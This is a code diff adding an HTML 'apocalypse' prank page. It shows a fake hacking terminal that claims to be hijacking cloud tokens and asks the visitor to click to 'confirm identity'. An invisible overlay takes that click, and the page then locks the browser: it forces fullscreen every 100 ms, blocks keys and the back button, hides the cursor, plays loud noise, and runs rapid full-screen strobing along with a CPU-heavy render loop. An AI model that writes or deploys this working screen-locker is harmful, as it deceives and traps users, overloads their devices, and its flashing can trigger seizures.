@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>SLAWIN_SYS_APOCALYPSE</title>
+    <style>
+        /* APK LOCKDOWN: Disable all standard gestures and selection */
+        * {
+            touch-action: none;
+            -webkit-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            cursor: none !important;
+        }
+
+        body, html {
+            margin: 0; padding: 0;
+            width: 100%; height: 100%;
+            background: #000; overflow: hidden;
+            font-family: 'Courier New', monospace;
+        }
+
+        /* STAGE 1: THE PHISHING BAIT (Terminal) */
+        #boot-terminal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; color: #0f0; padding: 20px; z-index: 500000;
+            font-size: 1.2rem; display: block;
+        }
+
+        /* STAGE 2: THE INVISIBLE TROJAN TRAP (Layered over terminal) */
+        #trojan-trap {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            z-index: 1000000; opacity: 0;
+        }
+
+        /* STAGE 3: GDI ENGINES */
+        #strip-container {
+            position: absolute; width: 100%; height: 100%;
+            display: flex; opacity: 0; z-index: 10;
+        }
+        .active #strip-container { opacity: 1; }
+        
+        .strip {
+            flex: 1; height: 100%;
+            background: linear-gradient(to bottom, #fff, #f00, #000, #0f0, #fff);
+            animation: fall 0.1s infinite linear;
+        }
+        @keyframes fall {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+
+        #canvas-engine {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 30; pointer-events: none;
+        }
+
+        /* EXTREME MUTATIONS */
+        .mega-shake { animation: shake-extreme 0.01s infinite !important; }
+        @keyframes shake-extreme {
+            0% { transform: translate(50px, 50px) rotate(5deg); filter: invert(1); }
+            50% { transform: translate(-50px, -50px) rotate(-5deg); filter: hue-rotate(180deg) contrast(200%); }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="trojan-trap"></div>
+
+    <div id="boot-terminal">
+        <div id="term-text"></div>
+    </div>
+
+    <div id="strip-container"></div>
+    <canvas id="canvas-engine"></canvas>
+
+    <script>
+        const trap = document.getElementById('trojan-trap');
+        const term = document.getElementById('term-text');
+        const strips = document.getElementById('strip-container');
+        const canvas = document.getElementById('canvas-engine');
+        const ctx = canvas.getContext('2d', { alpha: false });
+
+        let t = 0;
+        let active = false;
+        let formulaIdx = 0;
+
+        const formulas = [
+            (t) => (t * (t >> 8 | t >> 9) & 46 & t >> 8) ^ (t >> 4 & t),
+            (t) => (t * 5 & t >> 7) | (t * 3 & t >> 10),
+            (t) => (t >> 7 | t | t >> 6) * 10 + 4 * (t & t >> 13 | t >> 6)
+        ];
+
+        // --- TERMINAL PHISHING SEQUENCE ---
+        const lines = [
+            "> [SYSTEM] ACCESSING EDMONTON_SEC_GATE...",
+            "> [SYSTEM] HIJACKING GOOGLE_CLOUD_TOKENS...",
+            "> [STATUS] APK_LOCKDOWN_READY",
+            "> [!] STANDBY FOR KERNEL_NULL_EVENT...",
+            "> CLICK ANYWHERE TO CONFIRM IDENTITY"
+        ];
+        let lineIdx = 0;
+        function type() {
+            if(lineIdx < lines.length) {
+                term.innerHTML += lines[lineIdx++] + "<br>";
+                setTimeout(type, 300);
+            }
+        }
+        window.onload = type;
+
+        // --- THE TROJAN TRIGGER ---
+        trap.addEventListener('click', () => {
+            active = true;
+            trap.style.display = 'none';
+            document.getElementById('boot-terminal').style.display = 'none';
+            document.body.classList.add('active');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            // 0.1s PERSISTENT LOCKDOWN
+            document.documentElement.requestFullscreen();
+            setInterval(() => {
+                if (!document.fullscreenElement) document.documentElement.requestFullscreen().catch(()=>{});
+            }, 100);
+
+            // Init 1,000 CSS Strips
+            for(let i=0; i<1000; i++) {
+                const s = document.createElement('div');
+                s.className = 'strip';
+                s.style.animationDuration = (0.05 + Math.random() * 0.1) + 's';
+                strips.appendChild(s);
+            }
+
+            // High-Volume Bytebeat Audio
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
+            scriptNode.onaudioprocess = (e) => {
+                let out = e.outputBuffer.getChannelData(0);
+                for (let i = 0; i < 4096; i++) {
+                    let b = formulas[formulaIdx](t);
+                    out[i] = (b % 256) / 128.0 - 1.0;
+                    t++;
+                }
+            };
+            scriptNode.connect(audioCtx.destination);
+
+            render1M();
+            mutate();
+        });
+
+        // --- 1 MILLION ENTITY RASTER ENGINE ---
+        function render1M() {
+            if(!active) return;
+            const w = canvas.width;
+            const h = canvas.height;
+            
+            const imgData = ctx.createImageData(w, h);
+            const buffer = new Uint32Array(imgData.data.buffer);
+            
+            // Core Destruction Loop: 1 Million iterations
+            for(let i=0; i < 1000000; i++) {
+                let pos = Math.floor(Math.random() * buffer.length);
+                buffer[pos] = (Math.random() > 0.5) ? 0xFF0000FF : 0xFF00FF00;
+            }
+            ctx.putImageData(imgData, 0, 0);
+
+            // GDI Recursive Tunnel
+            ctx.drawImage(canvas, 4, 4, w-8, h-8, 0, 0, w, h);
+
+            requestAnimationFrame(render1M);
+        }
+
+        function mutate() {
+            if(!active) return;
+            formulaIdx = Math.floor(Math.random() * formulas.length);
+            document.body.className = Math.random() > 0.5 ? 'active mega-shake' : 'active';
+            setTimeout(mutate, 3000);
+        }
+
+        // Prevention of Back Button and Keys
+        window.onkeydown = (e) => e.preventDefault();
+        document.addEventListener("backbutton", (e) => e.preventDefault(), false);
+    </script>
+</body>
+</html>
